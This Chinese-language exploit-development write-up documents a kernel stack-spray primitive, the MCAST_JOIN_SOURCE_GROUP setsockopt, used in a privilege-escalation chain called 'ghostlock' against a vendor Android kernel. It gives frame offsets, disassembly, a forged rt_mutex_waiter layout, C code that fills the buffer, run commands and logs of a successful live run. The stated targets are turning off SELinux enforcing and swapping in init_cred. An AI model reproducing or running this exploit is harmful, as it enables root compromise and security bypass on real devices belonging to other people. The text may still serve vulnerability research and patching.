# MCAST source-group 栈拷贝 transport 技术分析

> 日期：2026-09-13
> 关联：[利用报告](2026-09-13_利用报告-iqooneo9s-ghostlock.md) · [waiter 与 PI walk](2026-09-13_技术分析-rtmutex-waiter与PI-walk.md)
> 结论：`setsockopt(SOL_IP, MCAST_JOIN_SOURCE_GROUP, buf, 0x108)` 是一次位于 `do_ip_setsockopt` 内的 0x108 字节用户→栈拷贝，拷贝区间完整覆盖 stale `rt_mutex_waiter`，实测可完成投毒。

## 1. 为什么需要新 transport

利用要求把伪造 `rt_mutex_waiter` 写到 waiter 线程内核栈的固定位置（`pi_blocked_on` 悬挂处）。本机内核为厂商 +pgo,+bolt 构建，栈帧几何与 GKI 参照不同：

| Transport | 拷贝机制 | 拷贝落点（相对系统调用函数入口 S'） | 与 waiter（S'−0x2D8）关系 | 判定 |
|-----------|----------|--------------------------------------|---------------------------|------|
| TCP `TCP_ZEROCOPY_RECEIVE` | `copy_from_sockptr_offset` 0x40 字节 | `do_tcp_getsockopt sp+0x40` = S'−0x1E0 | 浅 **0xF8**（只覆盖到 waiter+0xF8 以上） | 不可用（实测 NULL-lock panic） |
| pselect fd_set 拷贝 | `core_sys_select` 内 fd_set 拷贝 | word0 = S'−0x200 | 同量级偏差（delta ≈ −216） | 不可用 |
| **MCAST source-group** | `copy_from_sockptr` **0x108** 字节 | `do_ip_setsockopt sp+0x18` = **S'−0x338** | 覆盖 S'−0x338 … S'−0x230 ⊇ waiter 全区 | **可用（实测成功）** |

## 2. setsockopt 调用链与栈几何

MCAST 走 IPv4 的 `do_ip_setsockopt`：socket 为 AF_INET TCP，`level=SOL_IP(0)`、`optname=MCAST_JOIN_SOURCE_GROUP(46)`。逐帧反汇编（E-002）：

| 层 | 函数（文件偏移） | 帧大小 | 累计 |
|----|------------------|--------|------|
| 1 | `__arm64_sys_setsockopt @0xda3428` | `stp x29,x30,[sp,#-0x10]!` = 0x10 | 0x10 |
| 2 | `__sys_setsockopt @0xda3258` | `sub sp,#0x60` = 0x60 | 0x70 |
| 3 | `sock_common_setsockopt @0xdaedc4` | 0x10 | 0x80 |
| 4 | `tcp_setsockopt @0xee7214`（level≠6 → icsk_af_ops）| 0x10 | 0x90 |
| 5 | `ip_setsockopt @0xed8960`（level=0 → do_ip）| 0x40 | 0xD0 |
| 6 | `do_ip_setsockopt @0xed750c` | `stp x29,x30,[sp,#-0x50]!` + `sub sp,#0x230` = 0x280 | **0x350** |

拷贝目的地为 `do_ip_setsockopt` 帧内 `sp+0x18`，即 **S'−0x350+0x18 = S'−0x338**，长度 0x108。

### 2.1 栈布局（示意）

```text
高地址  S'（syscall 函数入口 SP）
 |     ┌──────────────────────────────────────────┐
 |     │ 调用方链帧：0x10+0x60+0x10+0x10+0x40 = 0xD0 │
 |     ├──────────────────────────────────────────┤ ← do_ip_setsockopt SP = S'−0x350
 |     │ do_ip_setsockopt 局部区 [sp, sp+0x280)      │
 |     │   buffer（group_source_req）: sp+0x18       │ ← 拷贝目的地 S'−0x338
 |     │   ██████████████████ 0x108 字节 ███████████ │
 |     │   └─ 其中部 0x60 处 = stale waiter          │ ← waiter = S'−0x2D8
 |     │      waiter[0x00..0x58) 全部被覆盖          │
 |     └──────────────────────────────────────────┘
低地址
```

- **waiter = S'−0x2D8**（futex 链：`0x70+0xD0+0x1C0 = 0x300`，rt_waiter 位于 `futex_wait_requeue_pi` 帧 `sp+0x28`，见 E-001）。
- 拷贝区间 `[S'−0x338, S'−0x230)` 完整包含 waiter `[S'−0x2D8, S'−0x280)`。
- 在缓冲内的相对偏移：**waiter = buffer + 0x60**。

### 2.2 与实测基准的对照

panic #8 现场（E-009）实测 waiter 位于 `stack_top−0x4B8`；而 `top−0x110`（pt_regs）与系统调用函数入口 S' 之间存在约 0xD0 的公共 SVC 入口路径帧（`do_el0_svc`/`invoke_syscall` 等，未逐帧核对）。以 S' 为基准时两组数据一致：`S'−0x2D8 = top−0x110−0xD0−0x2D8 = top−0x4B8`。MCAST 实测成功从行为上验证了该基准。

## 3. MCAST 分支反汇编（@0xed7684）

跳表（base `0xed7628`，表 `0x12c9224`）中 source-group 家族 optname（43/44/46/47）指向 `0xed7684`；直接反汇编验证如下：

```asm
; optname == MCAST_*_SOURCE_*（0x2b/0x2c/0x2e/0x2f）
add x0, sp, #0x18          ; dst = &greqs（帧内局部）
mov w1, wzr
mov w2, #0x108             ; sizeof(struct group_source_req)
bl  0x105c140              ; __memset(dst, 0, 0x108)
mrs x8, s3_0_c4_c1_0
ldr x8, [x8]
tbnz w8, #0x16, 0xed775c   ; TIF_32BIT → compat 路径（0x104 @ sp+0x120）
cmp w23, #0x108            ; optlen 必须精确等于 0x108
b.ne 0xed7794              ; 否则 -EINVAL
add x0, sp, #0x18
mov x1, x22                ; user optval
mov x2, x20                ; user optlen
mov w3, #0x108
bl  0xed8180               ; copy_from_sockptr(dst, user, 0x108)
cbnz w0, 0xed778c          ; -EFAULT
b 0xed7d7c                 ; 继续校验
```

要点：

- **32 位进程走 compat 路径**（0x104 字节 @ `sp+0x120`），布点会整体偏移；本利用为 64 位进程，走上述 0x108 路径。
- `optlen` 必须精确 `0x108`，否则 `-EINVAL`（不会有拷贝）。
- 调用前对 optname 0x23..0x30 会先取 `rtnl_lock`（0xde9ecc）与 `sockopt_lock_sock`（0xda96d4）。

## 4. 拷贝后校验与早退（@0xed7d7c）

```text
ldrh w8, [sp, #0x20]       ; gsr_group.ss_family（buffer+0x8）
mov  w20, #0xffffff9d      ; -EADDRNOTAVAIL
cmp  w8, #0x2              ; == AF_INET ?
b.ne 0xed8080              ; 否 → 早退
ldrh w8, [sp, #0xa0]       ; gsr_source.ss_family（buffer+0x88）
cmp  w8, #0x2
b.ne 0xed8080
...
```

早退路径 `0xed8080` 做 `sockopt_release_sock(0xda9700)` + `rtnl_unlock(0xde9fb0)` 后返回 `-EADDRNOTAVAIL`，**不会执行 `ip_mc_source`**。利用把 `buffer[8]`（= `gsr_group.ss_family`）留 0，使每次调用都在拷贝完成后干净返回，避免真实组播状态变更。实测 `errno=99` 即该路径（E-008）。

## 5. buffer → waiter 布点表

| buffer 偏移 | waiter 偏移 | 字段 | 写入值（含义） |
|-------------|-------------|------|----------------|
| 0x60 | +0x00 | `tree.__rb_parent_color` | `relink_pc`（写值） |
| 0x68 | +0x08 | `tree.rb_right` | 0 |
| 0x70 | +0x10 | `tree.rb_left` | `relink_left`（写目标） |
| 0x78 | +0x18 | `pi_tree.__rb_parent_color` | `relink_pc` |
| 0x80 | +0x20 | `pi_tree.rb_right` | 0 |
| 0x88 | +0x28 | `pi_tree.rb_left` | `relink_left` |
| 0x90 | +0x30 | `task` | `fake_task`（页内伪 task_struct） |
| 0x98 | +0x38 | `lock` | `fake_lock`（页内伪 rt_mutex） |
| 0xA0 | +0x40 | `wake_state` | 3 |
| 0xA4 | +0x44 | `prio` | 140（`FAKE_WAITER_PRIO`） |
| 0xA8 | +0x48 | `deadline` | 0 |
| 0xB0 | +0x50 | `ww_ctx` | 0 |
| 0x08 | —（waiter−0x58） | `gsr_group.ss_family` | 0（强制早退） |

其余字节全 0（`memset` + 未写区域）。

## 6. Payload 形状（值与叶）

值形状沿用 PR#127 的 compact 6.1 方案（`relink_pc`/`relink_left` 与 pselect 路由完全一致）：

| 场景 | fake_right | relink_pc | relink_left | 预期效果 |
|------|-----------|-----------|-------------|----------|
| 值写（W1，mode=1） | `base+0x100` | `base+0x100` | `selinux_enforcing` | 8 字节写入：低位字节 0（关 enforcing），byte2 须为奇（保住 `selinux_state.initialized`） |
| 值写（W2，mode=2） | `data_addr(init_cred)` | `init_cred` 别名 | 子进程 cred 字段 | cred 指向 init_cred |
| 叶写（W3 等零写） | 0 | `target−8` | 0 | 将 0 写到 `target` 或 `target+8`（由内容决定，W3-0 探测方向） |

> 代码取形：`relink_pc = fake_right ? fake_right : fake_parent;`
> `relink_left = fake_right ? pselect_custom_target : fake_left;`
> 该形状同时写入栈上 waiter 的 `tree` 与 `pi_tree` 两个节点（“one value shape”）。

## 7. 实现（src/core/fops.c）

核心逻辑（节选，完整实现见源码 `do_mcast_fake_lock_route()`）：

```c
#define MCAST_BUF_LEN 0x108
#define MCAST_WAITER_OFF 0x60
#define MCAST_ROUTE_ATTEMPTS 128
#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif

unsigned char buf[MCAST_BUF_LEN];
memset(buf, 0, sizeof(buf));
put64(buf, MCAST_WAITER_OFF + 0x00, relink_pc);
put64(buf, MCAST_WAITER_OFF + 0x10, relink_left);
put64(buf, MCAST_WAITER_OFF + 0x18, relink_pc);
put64(buf, MCAST_WAITER_OFF + 0x28, relink_left);
put64(buf, MCAST_WAITER_OFF + 0x30, fake_task);
put64(buf, MCAST_WAITER_OFF + 0x38, fake_lock);
put32(buf, MCAST_WAITER_OFF + 0x40, 3);
put32(buf, MCAST_WAITER_OFF + 0x44, FAKE_WAITER_PRIO);
/* buf[8] 保持 0：gsr_group.ss_family → 校验早退 */

int ret = setsockopt(fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
/* ret == -1 && errno == EADDRNOTAVAIL 表示拷贝已发生 */
```

路由选择（`src/core/util.c`）：

```c
int mcast_route_selected(void);
int tcp_route_selected(void) {
  if (mcast_route_selected()) return 0;   /* MCAST 使用 pselect 页面布局 */
  ...
}
```

- `GHOSTLOCK_ROUTE=mcast` 或 `GHOSTLOCK_MCAST_ROUTE=1` 选择 MCAST。
- `main.c` 的 waiter 线程分发顺序：`mcast → tcp → pselect`。
- 因 `tcp_route_selected()` 返回 0，`prepare_skb_payload()` 自动使用 pselect 页面布局与值形状（`payload_delta=-0xe80`、`fake_task=base+0x400` 等）。

## 8. 验证结果

**observe 冒烟**（不触发 walk）：

```text
[*] mcast route enter observe=1 page=ffffff815a190000 lock=ffffff815a190000 ...
[*] obs seq=1 ret=-1 errno=99
...
[*] obs seq=32 ret=-1 errno=99
[*] mcast route done=0 observe=1 calls=0 success=0 step=0 errno=0
```

每 32 次尝试全部 `errno=99`，表明：进入 MCAST 分支 → 执行 0x108 拷贝 → 族校验早退；期间无 panic。

**live 实测**：

```text
[*] mcast route enter observe=0 page=ffffff815b958000 lock=ffffff815b958000
    task=ffffff815b958400 pc=ffffff815b958100 left=ffffff800247f298 ...
[*] mcast route won seq=16
[*] mcast route done=1 observe=0 calls=1 success=1 step=0 errno=0
```

`arm_seq=16` 首次触发 consumer walk 即命中，随后 W1 验证通过并继续 W2/W3。

## 9. 复现命令

```bash
# 反汇编复核本原语
disasm_sym.exe <boot.img> 0xed7684
# 运行（observe 冒烟）
GHOSTLOCK_OBSERVE=1 GHOSTLOCK_ROUTE=mcast GHOSTLOCK_CORE=4 GHOSTLOCK_CONSUMER_CORE=5 ./ghostlock
```

## 10. 适用范围与风险

- 本原语依赖 `do_ip_setsockopt` 的 `group_source_req` 局部变量与调用链帧长（0x350），**换内核需重新测量**。
- optname 43/44/46/47 同族等价；使用 46 时零化族字段可确保不产生真实组播副作用。
- 若设备禁用 IPv4 MCAST 相关配置（`CONFIG_IP_MULTICAST`），该分支不存在，需回退 pselect/其他原语（本机确认存在）。
